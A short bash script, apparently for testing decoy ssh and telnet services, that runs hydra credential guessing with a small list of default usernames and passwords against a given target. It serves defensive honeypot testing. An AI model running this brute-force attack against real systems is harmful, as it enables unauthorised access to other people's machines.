#!/usr/bin/env bash
# Credential guessing against the decoy ports 22 (ssh) and 23 (telnet), tiny word list.
# Usage: TARGET=<ip> [DURATION=20] ./brute-telnet-ssh.sh
set -euo pipefail
. "$(dirname "$0")/common.sh"
need hydra; need_target
d=$(mktemp -d); trap 'rm -rf "$d"' EXIT
printf '%s\n' root admin user pi test guest >"$d/users"
printf '%s\n' root admin 1234 password 12345 raspberry guest >"$d/pass"
for svc in ssh telnet; do
	echo "== $svc =="
	timeout "$DURATION" hydra -L "$d/users" -P "$d/pass" -t 4 -f "$svc://$TARGET" || true
done
